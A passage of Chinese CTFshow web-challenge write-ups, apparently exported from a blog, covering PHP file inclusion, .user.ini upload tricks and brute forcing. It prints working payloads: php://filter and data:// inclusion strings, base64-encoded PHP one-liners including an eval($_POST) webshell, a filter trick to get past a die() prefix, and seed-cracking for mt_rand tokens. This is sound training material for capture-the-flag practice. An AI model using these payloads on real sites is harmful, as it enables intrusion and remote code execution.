<p><strong>为了利用auto_append_file，我们首先上传.user.ini内容为 auto_append_file=“xxx” xxx为我们上传的文件名，接着上传一个带木马的图片 , 这样就在每个php文件上包含了我们的木马文件。</strong></p>
<p><img src="https://img.npfs06.top/20210308093905.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210308093827.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里要注意一下，蚁剑连接的url为upload目录</p>
<p><img src="https://img.npfs06.top/20210308093515.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_文件包含</title>
    <url>/2020/10/11/CTFshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>CTFshow_web入门_文件包含</p>
<a id="more"></a>

<p><img src="http://img.npfs06.top/20210226200957.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h2><p>payload:?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<h2 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h2><p>payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</p>
<h2 id="web-80-81"><a href="#web-80-81" class="headerlink" title="web 80-81"></a>web 80-81</h2><p>关于日志文件包含的知识点这个文章里已经写的很详细了<a href="http://npfs06.top/2020/07/04/日志文件包含" target="_blank">日志文件包含</a></p>
<p>可能要多发包几次</p>
<p><img src="http://img.npfs06.top/20210226161849.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210226161903.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h2><p>解法单独写了一篇文章：<a href="http://npfs06.top/2020/10/11/利用PHP-SESSION-UPLOAD-PROGRESS进行文件包含" target="_blank">利用PHP-SESSION-UPLOAD-PROGRESS进行文件包含</a></p>
<h2 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h2><p>P神文章奉上：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list" target="_blank">谈一谈php://filter的妙用</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先分析一下这个代码，主要就是说过滤了php、data、: 、. ,然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有<?php die('大佬别秀了');?>，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了</p>
<p>我们所要做的就是绕过die ，从而执行我们写入的一句话，如何绕或在P神的文章里写了很详细了，总共有三种方法，不过我在这个题目，尝试这三种方法，但只有一种成功。可能是因为版本原因或是别的….，导致另外两种方法执行失败</p>
<p>我用的是base64-decode的解法</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">将 php:<span class="comment">//filter/read=convert.base64-encode/resource=123.php 进行两次url编码，得到如下</span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">30</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">38</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">30</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">41</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">39</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">43</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">34</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">31</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">34</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">44</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">34</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">31</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">34</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">44</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">34</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">35</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">44</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">31</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">33</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">32</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">30</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">36</span><span class="meta">%</span><span class="number">38</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">37</span><span class="meta">%</span><span class="number">30</span><span class="meta">%</span><span class="number">0</span>D<span class="meta">%</span><span class="number">0</span>A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）</p>
<p><img src="http://img.npfs06.top/20210226161925.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>之后来到123.php页面，命令执行即可</p>
<p><img src="http://img.npfs06.top/20210226161937.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h2><p>payload:?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</p>
<p>即 ?file=data://text/plain;base64,<?php system('cat fl0g.php');?></p>
<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>hint: misc+lfi</p>
<p>既然提示了misc,那就按照misc的常见解法，把视频下载下来，binwalk 分离试下，得到一张图片。图片内容如下：</p>
<p><img src="http://img.npfs06.top/20210226162658.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>尝试</p>
<blockquote>
<p>?file=/etc/passwd</p>
</blockquote>
<p>把视频下载下来，notepad++打开发现确实是/etc/passwd文件内容，知道了思路，接下去就简单了</p>
<p>payload:</p>
<blockquote>
<p>?file=compress.zlib:///var/www/html/flag.php </p>
<p>?file=flag.php</p>
</blockquote>
<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
<p>死亡die绕过</p>
<p>可以使用convert.iconv.*<br><a href="https://xz.aliyun.com/t/8163#toc-11" target="_blank">file_put_content和死亡·杂糅代码之缘</a><br>原理：对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除。</p>
<p>构造</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get</span>:?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.iconv.UCS<span class="number">-2</span>LE.UCS<span class="number">-2</span>BE/resource=<span class="keyword">a</span>.php</span><br><span class="line"><span class="built_in">post</span>:contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_爆破</title>
    <url>/2020/10/11/CTFshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>CTFshow web入门之爆破</p>
<a id="more"></a>

<p><img src="http://img.npfs06.top/20210223152515.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>先随便输入账号密码，抓包</p>
<p><img src="http://img.npfs06.top/20210223152534.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解密，可以发现账号密码的形式为   账号：密码，这里我们采用 Custom iterator进行爆破</p>
<p>使用方法可参考：<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html" target="_blank">Custom iterator的使用</a></p>
<p><img src="http://img.npfs06.top/20210223152601.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210223152616.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210223152635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210223152650.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>爆破即可得到flag</p>
<p><img src="http://img.npfs06.top/20210223152708.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>子域名爆破</p>
<p>flag.ctfer.com</p>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接在源代码上改改，写个脚本就好了 (假设是三位的数)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span> (strlen(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">62</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = <span class="number">0</span>; <span class="variable">$b</span> &lt; <span class="number">62</span>; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">62</span>; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span> (substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>)) + intval(substr(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>)) + substr(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) / substr(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === intval(substr(<span class="variable">$token</span>, <span class="number">31</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解出来答案很多</p>
<p><img src="http://img.npfs06.top/20210223152726.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>随便GET传参一个即可得到flag</p>
<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>考察点：伪随机数</p>
<p>了解伪随机数可参考此文<a href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank">伪随机数</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210223152748.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>GET传参即可</p>
<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br></pre></td></tr></table></figure>
<p>根据这句，可以通过传入的<code>r</code>得到第一个随机数，之后我们可以通过工具<code>php_mt_seed </code><a href="https://github.com/lepiaf/php_mt_seed" target="_blank">地址</a></p>
<p>进行逆推，得到种子</p>
<p><img src="http://img.npfs06.top/20210223152840.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>通过抓包查看响应头我们可以知道该php版本为7.3.11，因此可能的种子就是如图两种</p>
<blockquote>
<p>   if($_COOKIE[‘token’]==(mt_rand()+mt_rand()))</p>
</blockquote>
<p>通过该行代码我们知道要将两个随机数相加，脚本如下</p>
<p><img src="http://img.npfs06.top/20210223152857.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>burp抓吧修改即可</p>
<p><img src="http://img.npfs06.top/20210223152912.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>注</strong>：</p>
<p>关于这里为什么要?r=1819399594,因为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>只有在$rand不存在时，$_COOKIE[‘token’]==(mt_rand()+mt_rand() 才能执行，而1819399594是我们在传?r=0时页面输出的随机数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br></pre></td></tr></table></figure>
<p>此时的$rand = mt_rand()即第一个生成的随机数，因此只要我们使$r=mt_rand()=1819399594，就能让$rand=0，不存在，从而执行接下来的代码</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>在安装页面，查看源码，可以发现js代码</p>
<p><img src="http://img.npfs06.top/20210223152937.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在checkdb.php页面POST即可</p>
